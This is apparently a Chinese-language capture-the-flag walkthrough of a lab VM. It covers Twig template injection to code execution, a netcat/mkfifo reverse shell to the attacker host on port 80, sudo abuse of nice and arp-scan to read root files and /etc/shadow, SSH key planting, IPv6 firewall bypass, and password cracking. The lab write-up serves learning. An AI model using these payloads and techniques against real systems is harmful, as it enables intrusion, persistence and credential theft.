# 初始突破与信息收集

常规的起手式，先在同网段扫一下存活主机，定位到靶机 IP。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l                 
[sudo] password for kali:                                          
Interface: eth0, type: EN10MB, MAC: 00:0c:29:1c:b5:a2, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.166 08:00:27:34:20:41       PCS Systemtechnik GmbH
...
```

明确目标 IP 为 `192.168.205.166` 后，直接扫全端口。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p 0-65535 192.168.205.166       
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-30 06:38 -0400
Nmap scan report for 192.168.205.166
Host is up (0.00022s latency).
Not shown: 65535 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:34:20:41 (Oracle VirtualBox virtual NIC)
```

只有 80 端口是开着的，直接去看 Web 服务。

## SSTI 漏洞探测与绕过

Web 界面是一个代理配置生成器。当时我在目标服务器地址的输入框里顺手填了个 `;id`，点击生成后，页面直接回显了 `./suo5 -t http://;id/suo5.jsp`。这种输入直接原样拼接渲染到页面的情况，一眼 SSTI（服务端模板注入）。

![image-20260330183936764](http://7r1UMPHK.github.io/image/20260406134417795.webp)

为了验证并找到能执行命令的 payload，我先按常规的 Python Jinja2 模板去打。

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
<% const require = this.process.mainModule.require; const { execSync } = require('child_process'); const output = execSync('id'); %><%= output %>
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

测试了一圈全部失败，明显存在过滤规则或者引擎不对。期间页面抛出了 `"dynamic" at line 1` 和 `Unknown "attr" filter` 的错误信息。

这几个报错是 PHP 模板引擎 Twig 的典型特征。为了进一步确认，我输入了 `{{ 7*'7' }}` 进行测试。Jinja2 会把它当成字符串拼接返回 `7777777`，而 Twig 会进行数字运算返回 `49`。页面回显了 49，实锤是 Twig。

查阅 Twig 的 RCE payload 后，构造了下面的语句。

```php
{{['id']|filter('system')}}
```

成功返回了 id 命令的结果，命令执行拿到了。

## 绕过出网限制反弹 Shell

考虑到靶机整体比较小，推测底层是 Alpine 系统，这种系统通常没有 bash，只有 sh 或 ash。我先在 Kali 本地起了一个 8888 端口的监听。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888                
listening on [any] 8888 ...
```

执行 payload：`{{ ['rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc 192.168.205.128 8888 >/tmp/f']|filter('system') }}`。
结果 Kali 这边毫无反应。这里我判断目标机器内部配置了防火墙，限制了不常见的端口出网。出题人一般很难把 80 端口的出网也封死，因为要保持 web 服务的正常运行。

于是我立刻换成监听 80 端口。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.166] 38559
/bin/sh: can't access tty; job control turned off
~/html $ id
uid=101(apache) gid=102(apache) groups=82(www-data),102(apache),102(apache)
```

调整端口后成功弹回了 shell，当前权限是 `apache`。

# 本地提权与横向移动

## 意外的 Sudo 权限获取

拿到基础 shell 后，常规操作先找找有没有 Python 来升级交互式 shell。

```bash
~/html $ which python3 python script
```

全部为空，果然是精简的 Alpine。

接着去 `/home` 目录下翻找，看看有几个用户。

```bash
~/html $ cd /home
/home $ ls -la
total 12
drwxr-xr-x    3 root     root          4096 Mar  5 15:48 .
drwxr-xr-x   21 root     root          4096 Jan 27 08:17 ..
drwxr-sr-x    2 lanyangyang lanyangyang      4096 Mar  5 16:11 lanyangyang
/home $ su -
Password: lanyangyang

su: incorrect password
```

发现了一个叫 `lanyangyang` 的用户，尝试直接用用户名当弱密码 su 过去，失败了。

进到用户目录看看有什么遗留文件，顺便跑一下 SUID 和当前用户的文件搜索。

```bash
/home $ cd lanyangyang
/home/lanyangyang $ ls -la
...
-rw-------    1 lanyangyang lanyangyang        44 Mar  5 16:11 user.txt
/home/lanyangyang $ find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null
---s--x--x    1 root     root         14224 Dec 16 14:19 /bin/bbsuid
-rwsr-xr-x    1 root     root        199632 Jul 26  2025 /usr/bin/sudo
-rwsr-xr-x    1 root     root         14224 Dec  7 17:12 /usr/sbin/suexec
/home/lanyangyang $ find / -user $(whoami) ! -path '/proc/*' ! -path '/sys/*' ! -path '/run/*' 2>/dev/null
...大量web和composer相关文件...
```

看到了 `user.txt` 但权限不够读不了。SUID 文件和所属文件也没有能直接利用的。

这时候我顺手敲了一个 `sudo -l`，结果真的打了我一个措手不及——一个 Web 权限的低权限用户居然配了 sudo 规则。

```bash
Matching Defaults entries for apache on suo:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for apache:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User apache may run the following commands on suo:
    (lanyangyang) NOPASSWD: /bin/nice
```

这里允许 `apache` 免密以 `lanyangyang` 的身份运行 `/bin/nice`。查一下 GTFOBins 就能拿到对应的提权 payload。

```bash
/tmp $ sudo -u lanyangyang /bin/nice /bin/sh
id
uid=1000(lanyangyang) gid=1000(lanyangyang) groups=1000(lanyangyang)
```

利用 `/bin/nice` 直接切到了 `lanyangyang` 用户的 shell。

## IPv6 绕过防火墙建立稳定连接

因为反弹的 shell 极其不稳定，我习惯写个公钥进去直接 SSH 连，这样操作舒服一点。

```bash
mkdir ~/.ssh;echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINnpPlGDLyjGkyXBGeTKaRc75+aZub2aOXI8yD+mFadI kali@kali' > ~/.ssh/authorized_keys
```

写入公钥后，在 Kali 端发起连接。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh lanyangyang@192.168.205.166
ssh: connect to host 192.168.205.166 port 22: Connection refused
```

22 端口直接拒绝连接。结合之前反弹 shell 只能用 80 端口的情况，这里肯定是防火墙把 IPv4 的 SSH 端口给掐了。
这时候我换了个思路，IPv4 防火墙配得严，IPv6 往往会有疏漏。尝试去扫一下同网段的 IPv6 链路本地地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ping6 -I eth0 ff02::1  
...
64 bytes from fe80::20c:29ff:fe1c:b5a2%eth0: icmp_seq=1 ttl=64 time=1.23 ms
64 bytes from fe80::a00:27ff:fe34:2041%eth0: icmp_seq=1 ttl=64 time=2.90 ms
^C
```

找到了靶机的 IPv6 地址 `fe80::a00:27ff:fe34:2041`，直接指定网卡用 IPv6 去连 SSH。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh lanyangyang@fe80::a00:27ff:fe34:2041%eth0
...
Welcome to Alpine!
...
lanyangyang@suo:~$  id
uid=1000(lanyangyang) gid=1000(lanyangyang) groups=1000(lanyangyang),1000(lanyangyang)
```

成功绕过防火墙拿到了一个完美的交互式 SSH shell。

# 权限获取与关键证据

在 `lanyangyang` 用户下再次检查 sudo 权限，寻找提权到 root 的路径。

```bash
lanyangyang@suo:~$ sudo -l
...
User lanyangyang may run the following commands on suo:
    (ALL) NOPASSWD: /usr/bin/arp-scan
```

可以免密以 root 执行 `arp-scan`。这个命令 GTFOBins 上是没有现成利用手法的，只能自己摸索。

```bash
lanyangyang@suo:~$ sudo /usr/bin/arp-scan -h
...
--file=<s> or -f <s>    Read hostnames or addresses from the specified file
                        One name or address pattern per line. Use "-" for stdin.
...
```

翻看帮助文档，发现 `-f` 参数可以从指定文件读取主机名或 IP 地址。如果读取的内容不是合法的 IP 格式，程序很可能会在报错时把读取到的内容原样打印出来。

利用这个特性，我直接去读 `/root/root.txt`。

```bash
lanyangyang@suo:~$ sudo /usr/bin/arp-scan -f /root/root.txt
Interface: eth0, type: EN10MB, MAC: 08:00:27:34:20:41, IPv4: 192.168.205.166
WARNING: get_host_address failed for "flag{root-8438726c502a452d997ba300afac30fe}": Try again - target ignored
ERROR: No hosts to process.
lanyangyang@suo:~$ cat /home/lanyangyang/user.txt 
flag{user-da4e2b9944cf4d0389a894c8d718444f}
```

果然报错信息里把 root flag 给带出来了，顺便把刚才没权限看的 user flag 也读了。

虽然拿到了 flag，但想要一个真正的 root shell 的话，既然能任意读文件，就可以把 `/etc/shadow` 读出来尝试爆破。

```bash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
111111111111111  (root)   
1g 0:00:00:00 DONE (2026-03-30 07:08) 2.439g/s 19980p/s 19980c/s 19980C/s horoscope..whitetiger
```

John the Ripper 秒解，root 密码是 `111111111111111`，直接切换即可拿到完整权限。